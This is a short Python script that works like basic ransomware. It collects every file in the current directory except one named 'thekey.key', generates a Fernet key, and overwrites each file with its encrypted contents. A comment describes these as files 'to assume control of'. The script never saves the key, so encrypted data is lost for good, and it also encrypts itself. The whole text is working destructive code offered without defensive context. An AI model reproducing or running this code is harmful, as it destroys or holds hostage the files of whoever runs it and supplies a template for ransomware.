# import os and Fernet modules
import os
from cryptography.fernet import Fernet

# finding files to assume control of
files = [] 

for file in os.listdir():
    if file == "thekey.key":
        continue 
    if os.path.isfile(file):
        files.append(file)

print(files)

# generate a new key
key = Fernet.generate_key()

# rb as in read binary 
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
# takes file opens files encryptes it and writes it back to the file as a encrypted file
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted) 
